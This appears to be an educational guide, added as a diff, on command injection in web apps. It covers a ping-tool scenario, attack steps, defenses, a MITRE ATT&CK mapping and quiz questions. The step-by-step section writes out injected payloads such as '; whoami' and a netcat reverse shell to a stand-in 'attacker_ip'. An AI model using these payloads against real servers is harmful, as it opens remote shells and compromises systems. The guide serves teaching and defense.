@@ -1,0 +1,285 @@
+Command Injection Attack
+- A web application attack where an attacker injects operating system commands into vulnerable input fields to execute commands on the server.
+
+==================================================
+Attack Metadata
+==================================================
+
+Category:
+Web Attacks → Injection Attacks
+
+Attack Stage:
+Initial Access
+Execution
+Privilege Escalation
+Persistence
+
+Difficulty:
+Intermediate
+
+Stealth Level:
+Medium
+
+Requires Authentication:
+No (depends on vulnerability)
+
+Tools Used:
+Burp Suite
+OWASP ZAP
+Netcat
+Custom Payloads
+
+
+==================================================
+1. Overview
+==================================================
+Command injection occurs when a web application passes user-supplied input directly to a system shell without proper validation or sanitization.
+
+If the application executes system commands using this input, attackers may append additional commands.
+
+This allows attackers to execute arbitrary commands on the server.
+
+Command injection vulnerabilities often appear in features such as:
+
+- network diagnostic tools (ping, traceroute)
+- file processing utilities
+- system administration panels
+- monitoring dashboards
+
+Successful command injection can result in full system compromise.
+
+
+==================================================
+2. Attack Scenario
+==================================================
+A web application includes a feature that allows users to check network connectivity.
+
+Example input field:
+
+Enter IP address to ping
+
+The application runs a command such as:
+
+ping 8.8.8.8
+
+If the input is not sanitized, an attacker may inject additional commands.
+
+Example malicious input:
+
+8.8.8.8; whoami
+
+The server executes both commands, revealing system information.
+
+
+==================================================
+3. Tools Required
+==================================================
+
+Burp Suite
+Used to intercept and modify web requests.
+
+OWASP ZAP
+Used to test web application vulnerabilities.
+
+Netcat
+Used to establish reverse shells.
+
+Custom Payloads
+Used to inject operating system commands.
+
+
+==================================================
+4. Attack Workflow
+==================================================
+
+Identify Input Field
+        ↓
+Test Input for Injection
+        ↓
+Inject Command Payload
+        ↓
+Execute OS Commands
+        ↓
+Gain System Information
+        ↓
+Establish Remote Access
+
+
+==================================================
+5. Step-by-Step Execution
+==================================================
+Step 1 — Identify Vulnerable Input
+
+The attacker identifies a field that interacts with the operating system.
+
+Example:
+
+Ping tool
+
+
+Step 2 — Test for Injection
+
+Example payload:
+
+8.8.8.8; whoami
+
+If successful, the server returns the output of the command.
+
+
+Step 3 — Execute System Commands
+
+Example payload:
+
+8.8.8.8; uname -a
+
+This reveals operating system information.
+
+
+Step 4 — Explore System
+
+Example payload:
+
+8.8.8.8; ls
+
+
+Step 5 — Attempt Reverse Shell
+
+Example payload:
+
+8.8.8.8; nc attacker_ip 4444 -e /bin/bash
+
+
+Step 6 — Gain Remote Shell
+
+If successful, the attacker obtains remote command access to the server.
+
+
+==================================================
+6. Example Command Injection Scenario
+==================================================
+Application Feature
+
+A network diagnostic tool allows users to ping hosts.
+
+
+Input Injection
+
+The attacker inserts command separators.
+
+
+Command Execution
+
+The server executes both the intended command and the injected command.
+
+
+System Access
+
+The attacker retrieves system information.
+
+
+Privilege Escalation
+
+Further exploitation may lead to full system compromise.
+
+
+==================================================
+7. Expected Results
+==================================================
+Successful command injection attacks allow attackers to:
+
+- execute system commands
+- read sensitive files
+- install malware
+- create reverse shells
+- gain full system access
+
+This vulnerability often leads to severe security breaches.
+
+
+==================================================
+8. Defensive Considerations
+==================================================
+Organizations should implement strong input validation and secure coding practices.
+
+Input Validation
+
+Reject or sanitize unsafe characters.
+
+Parameterized Commands
+
+Avoid constructing shell commands using user input.
+
+Least Privilege
+
+Run applications with minimal permissions.
+
+Application Sandboxing
+
+Limit system-level access.
+
+Security Testing
+
+Regularly test applications for injection vulnerabilities.
+
+
+==================================================
+9. MITRE ATT&CK Mapping
+==================================================
+
+Technique:
+T1190 — Exploit Public-Facing Application
+
+Technique:
+T1059 — Command and Scripting Interpreter
+
+Technique:
+T1059.004 — Unix Shell
+
+Technique:
+T1059.003 — Windows Command Shell
+
+Technique:
+T1105 — Ingress Tool Transfer
+
+
+==================================================
+10. Questions & Answers
+==================================================
+
+Question:
+What is command injection?
+
+Answer:
+A vulnerability that allows attackers to execute operating system commands on a server.
+
+--------------------------------------------------
+
+Question:
+What type of application feature commonly leads to command injection?
+
+Answer:
+Features that execute system commands such as ping or traceroute tools.
+
+--------------------------------------------------
+
+Question:
+Which character is commonly used to chain commands in command injection attacks?
+
+Answer:
+The semicolon (;).
+
+--------------------------------------------------
+
+Question:
+What is a severe consequence of command injection?
+
+Answer:
+Remote command execution on the server.
+
+--------------------------------------------------
+
+Question:
+What is one of the best defenses against command injection?
+
+Answer:
+Proper input validation and avoiding shell command execution with user input.
